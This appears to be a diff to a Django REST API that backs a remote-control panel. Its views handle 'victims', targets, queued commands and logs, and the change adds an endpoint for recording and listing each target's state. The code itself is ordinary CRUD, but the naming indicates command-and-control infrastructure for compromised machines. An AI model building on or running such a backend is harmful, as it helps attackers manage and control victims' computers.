@@ -10,9 +10,7 @@ def get_client_ip(request):
     else:
         ip = request.META.get('REMOTE_ADDR')
     return ip
-def get(self, request):
-        victims = Target.objects.all()
-        return response.Response(VictimsSerializer(victims, many=True).data)
+
 
 class VictimeView(APIView):
     def get(self, request):
@@ -83,6 +81,26 @@ class Control(APIView):
         Command.objects.filter(command=command).delete()
         return response.Response({'message': 'Command deleted successfully !!!'})
     
+class StatesView(APIView):
+    def get(self, request):
+        target = request.GET.get('target')
+        if not target:
+            states = State.objects.all().order_by("-created")
+            return response.Response(StateSerializer(states, many=True).data)
+        return response.Response(StateSerializer(State.objects.filter(target=target).order_by("-created"), many=True).data)
+    
+    def post(self, request):
+        data = request.data
+        target = data.get('target')
+        state = data.get('state')
+        
+        State.objects.create(
+            target=target,
+            state=state,
+        )
+        
+        return response.Response({'message': 'State updated successfully !!!'})
+
 class LogView(APIView):
     def get(self, request):
         target = request.GET.get('target')
